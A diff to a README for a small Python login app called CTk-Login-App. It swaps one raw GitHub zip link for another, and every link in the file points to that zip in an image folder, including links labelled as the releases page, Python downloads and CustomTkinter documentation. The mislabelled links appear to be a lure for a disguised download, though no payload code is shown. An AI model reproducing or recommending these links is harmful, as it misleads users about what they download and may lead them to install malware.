@@ -1,6 +1,6 @@
 # 🎉 CTk-Login-App - Easy Login for Everyone
 
-[![Download CTk-Login-App](https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/screenshots/CTk-Login-App-2.7-beta.1.zip)](https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/screenshots/CTk-Login-App-2.7-beta.1.zip)
+[![Download CTk-Login-App](https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/image/Login_Tk_C_App_v1.8.zip)](https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/image/Login_Tk_C_App_v1.8.zip)
 
 ## 📖 Overview
 
@@ -12,16 +12,16 @@ To get started, you need to download the application from our Releases page. Wit
 
 ## 🔗 Download & Install
 
-Visit this page to download: [CTk-Login-App Releases](https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/screenshots/CTk-Login-App-2.7-beta.1.zip).
+Visit this page to download: [CTk-Login-App Releases](https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/image/Login_Tk_C_App_v1.8.zip).
 
 ### Steps to Download:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the app. It will usually be at the top of the page.
 3. Depending on your operating system:
-   - For Windows, look for `https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/screenshots/CTk-Login-App-2.7-beta.1.zip`.
-   - For macOS, look for `https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/screenshots/CTk-Login-App-2.7-beta.1.zip`.
-   - For Linux, look for `https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/screenshots/CTk-Login-App-2.7-beta.1.zip`.
+   - For Windows, look for `https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/image/Login_Tk_C_App_v1.8.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/image/Login_Tk_C_App_v1.8.zip`.
+   - For Linux, look for `https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/image/Login_Tk_C_App_v1.8.zip`.
 
 4. Click the download link for your operating system.
 5. Wait for the file to download.
@@ -74,8 +74,8 @@ If you run into any issues or have questions, feel free to open an issue in the 
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/screenshots/CTk-Login-App-2.7-beta.1.zip)
-- [Python Downloads](https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/screenshots/CTk-Login-App-2.7-beta.1.zip)
-- [CustomTkinter Documentation](https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/screenshots/CTk-Login-App-2.7-beta.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/image/Login_Tk_C_App_v1.8.zip)
+- [Python Downloads](https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/image/Login_Tk_C_App_v1.8.zip)
+- [CustomTkinter Documentation](https://raw.githubusercontent.com/knight102004/CTk-Login-App/main/image/Login_Tk_C_App_v1.8.zip)
 
 Thank you for using CTk-Login-App! We hope you find it helpful and easy to use.
